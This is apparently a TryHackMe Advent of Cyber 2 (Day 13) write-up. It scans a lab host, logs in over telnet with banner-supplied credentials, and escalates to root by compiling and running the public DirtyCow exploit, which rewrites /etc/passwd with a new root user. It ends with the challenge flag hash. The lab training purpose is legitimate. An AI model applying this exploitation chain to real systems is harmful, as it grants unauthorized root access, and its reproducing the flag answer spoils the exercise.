# _**adventofcyber2 Day 13**_
    
    https://tryhackme.com/room/adventofcyber2

-------------------------------------

                                                 
┌──(astute㉿kali)-[~]
└─$ nmap -sV -A 10.10.142.168
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 20:52 IST
Nmap scan report for 10.10.142.168
Host is up (0.43s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
23/tcp   open     telnet  Linux telnetd
111/tcp  open     rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36363/udp6  status
|   100024  1          37792/tcp   status
|   100024  1          44582/udp   status
|_  100024  1          53539/tcp6  status
9618/tcp filtered condor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


	=> telnet 

-------------------------------------

┌──(astute㉿kali)-[~]
└─$ telnet 10.10.194.225 23
Trying 10.10.194.225...
Connected to 10.10.194.225.
Escape character is '^]'.
HI SANTA!!! 

We knew you were coming and we wanted to make
it easy to drop off presents, so we created
an account for you to use.

Username: santa
Password: clauschristmas

We left you cookies and milk!

    => clauschristmas

----------------------------------------------

$ uname -a
Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"


	=> ubuntu 12.04

-----------------------------------------------
ls
christmas.sh  cookies_and_milk.txt
$ cat cookies_and_milk.txt
/*************************************************
// HAHA! Too bad Santa! I, the Grinch, got here 
// before you did! I helped myself to some of
// the goodies here, but you can still enjoy
// some half eaten cookies and this leftover
// milk! Why dont you try and refill it yourself!
//   - Yours Truly,
//         The Grinch
//*************************************************/

	=> Grinch

--------------------------------------------
`follow up the dirtycow c code souce and execute`

https://github.com/FireFart/dirtycow/blob/master/dirty.c

	=> gcc -pthread dirty.c -o dirty -lcrypt

---------------------------------------------------------

./dirty  
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiIoY9ux7Hzpc:0:0:pwned:/root:/bin/bash

	=> firefart

---------------------------------------------------
`do login with the password we created on ssh`

`ssh firefart@:10.10.130.165`

firefart@christmas:~# cat message_from_the_grinch.txt
Nice work, Santa!

Wow, this house sure was DIRTY!
I think they deserve coal for Christmas, don't you?
So let's leave some coal under the Christmas `tree`!

Let's work together on this. Leave this text file here,
and leave the christmas.sh script here too...
but, create a file named `coal` in this directory!
Then, inside this directory, pipe the output
of the `tree` command into the `md5sum` command.

The output of that command (the hash itself) is
the flag you can submit to complete this task
for the Advent of Cyber!

    - Yours,
        John Hammond
        er, sorry, I mean, the Grinch

      - THE GRINCH, SERIOUSLY

Following the instructions we use touch coal to create the coal file, then run tree | md5sum to get the final answer.

    => 8b16f00dd3b51efadb02c1df7f8427cc

# _Thank You_